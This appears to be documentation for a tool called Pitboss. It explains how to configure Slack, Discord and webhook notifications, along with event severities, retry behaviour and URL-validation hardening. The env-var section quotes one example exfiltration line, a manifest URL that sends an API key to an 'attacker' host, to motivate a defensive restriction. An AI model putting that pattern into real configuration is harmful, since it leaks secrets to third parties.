# Notifications

Pitboss can push notifications to external sinks when key run events occur. This is useful for monitoring long-running dispatches from outside the TUI — for example, getting a Slack message when a budget-intensive run finishes.

## Configuration

Add a `[[notification]]` section to your manifest for each sink:

```toml
[[notification]]
kind = "slack"
url = "${PITBOSS_SLACK_WEBHOOK_URL}"   # env-var substitution supported (prefix required, see below)
events = ["run_finished", "budget_exceeded"]
severity_min = "info"

[[notification]]
kind = "discord"
url = "${PITBOSS_DISCORD_WEBHOOK_URL}"
events = ["approval_request", "approval_pending", "run_finished"]

[[notification]]
kind = "webhook"
url = "https://my-server.example.com/pitboss-events"
events = ["approval_request", "budget_exceeded", "run_finished"]
```

The top-level field is `kind`, not `type`. TOML parses it literally — a `type = "slack"` line will be rejected with an `unknown field` error at validate time.

## Supported sinks

| Sink | `kind` value | Notes |
|------|-------------|-------|
| Generic HTTP POST | `"webhook"` | Sends a JSON payload with the event |
| Slack Incoming Webhook | `"slack"` | Formats as a Slack message block |
| Discord Webhook | `"discord"` | Formats as a Discord embed with severity-coded color, markdown-escaped fields, and `allowed_mentions: []` |
| Log only | `"log"` | Writes to stderr via `tracing`; useful for debugging + CI contexts where the operator watches logs |

## Events

| Event | Severity | When it fires |
|-------|---------|--------------|
| `approval_request` | Warning | An approval is enqueued for operator action (v0.6+) |
| `approval_pending` | Warning | An approval enqueues and awaits operator action with no TUI attached (v0.6+) — distinct from `approval_request` for alerting when a run is blocked |
| `run_finished` | Info | The dispatch completes (all tasks settled or cancelled) |
| `budget_exceeded` | Critical | A `spawn_worker` or `spawn_sublead` fails due to budget exhaustion |

## Severity filtering

The optional `severity_min` field filters by the event's declared severity (not a per-sink override — each event has a fixed severity). Ordering is `info < warning < error < critical`. Default is `"info"` (emit everything).

For example, `severity_min = "warning"` on a Discord sink skips `run_finished` (Info) but delivers `approval_request` (Warning) and `budget_exceeded` (Critical).

## Delivery semantics

- Notifications fire asynchronously via `tokio::spawn` — they don't block the dispatch.
- Failed deliveries are retried up to 3 times with exponential backoff (100ms → 300ms → 900ms).
- An LRU dedup cache (size 64) prevents retry storms for the same event. Dedup key is `{run_id}:{event_kind}[:{discriminator}]` (discriminator is `request_id` for approval events, `"first"` for budget exceeded).
- Delivery failures are logged via `tracing::error!` with the sink id and dedup key. The dispatcher continues regardless — notification failures never fail a run.
- Per-attempt HTTP timeout: 30 seconds.

## Env-var substitution

URLs support `${PITBOSS_VAR_NAME}` substitution from the process environment. This keeps webhook URLs (which are themselves secrets — anyone with the URL can post to the channel) out of manifest files that might be committed to git:

```toml
[[notification]]
kind = "slack"
url = "${PITBOSS_SLACK_WEBHOOK_URL}"
events = ["run_finished"]
```

**As of v0.7.1, only env vars whose names start with `PITBOSS_` may be substituted.** This closes an exfiltration vector where a rogue manifest could write `url = "https://attacker/?t=${ANTHROPIC_API_KEY}"` and leak any host env var to a chosen webhook. Unprefixed names fail loudly at validate time rather than silently reaching through to `std::env::var`.

If you were using an unprefixed var name in older manifests, rename it in your shell init (or deployment config):

```bash
# Before
export SLACK_WEBHOOK_URL="https://hooks.slack.com/..."

# After (v0.7.1+)
export PITBOSS_SLACK_WEBHOOK_URL="https://hooks.slack.com/..."
```

## Webhook URL validation (v0.7.1+)

Beyond the env-var prefix, all `webhook` / `slack` / `discord` URLs are validated at manifest load:

- Scheme must be `https://`. `http://`, `file://`, and other non-https schemes are rejected.
- Host must not resolve to a loopback, private, link-local, unspecified, broadcast, CGNAT (`100.64.0.0/10`), IPv6 ULA (`fc00::/7`), or IPv6 link-local (`fe80::/10`) address. IPv4-mapped IPv6 (`::ffff:127.0.0.1`) is also rejected.
- Hostnames like `localhost` and `*.localhost` are blocked by name.

If you need to post to an internal service for development, the workaround is to route through a public relay (e.g. an ngrok tunnel) — pitboss will not speak directly to a private address.

## Discord sink: markdown and mention safety (v0.7.1+)

The Discord sink escapes markdown and mention characters (`* _ ~ \` `|` `> # [ ] ( ) @ < :`) in untrusted fields (`request_id`, `task_id`, `summary`, `run_id`, `source`) before embedding them in the Discord description. Each payload also sets `allowed_mentions: { parse: [] }` so Discord doesn't resolve `@everyone` / `@here` / user / role / channel mentions even if one sneaks past the escaping.

Slack sink parallel hardening is a known roadmap item — until it lands, avoid routing untrusted content (task summaries from external sources) through Slack.

For the canonical notification schema reference, see [`AGENTS.md`](https://github.com/SDS-Mode/pitboss/blob/main/AGENTS.md) in the source tree.
